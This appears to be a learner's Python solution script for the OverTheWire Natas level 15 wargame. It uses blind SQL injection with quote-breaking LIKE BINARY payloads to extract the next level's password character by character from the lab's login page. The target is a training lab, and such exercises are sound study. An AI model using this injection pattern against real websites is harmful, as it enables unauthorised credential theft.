# this is the password cracking script, i have already gotten the correct characters via burp intruder

import requests


def check_final_password(final_password):
    url_check = f"http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password%3D%22{final_password}"

    response = requests.get(url_check, auth=('natas15', n15_pass))

    if "This user exists." in response.text:
        return True
    return False


# ----------------------------------------------------------------------------------------------------------------------

possible_characters = ['c', 'e', 'i', 'k', 'f', 'h', 'j', 'm', 'o', 's', 't', 'u', 'v', 'D', 'E', 'G', 'K', 'L', 'M', 'P', 'Q', 'V', 'W', 'X', 'Y', '3', '4', '6']

with open("passwords.txt") as file:
    n15_pass = file.read().splitlines()[15].split(":")[1]

password = []
current_pass = ''.join(password)

# ----------------------------------------------------------------------------------------------------------------------

while not check_final_password(current_pass):
    for char in possible_characters:

        url = f"http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22+AND+password+LIKE+BINARY+%22{current_pass + char}%25"
        response = requests.get(url, auth=('natas15', n15_pass))

        if "This user exists." in response.text:
            password.append(char)
            current_pass = ''.join(password)
            print(f"Password so far: {current_pass}")

# ----------------------------------------------------------------------------------------------------------------------

print(f"\nFinal Password: {"".join(password)}")
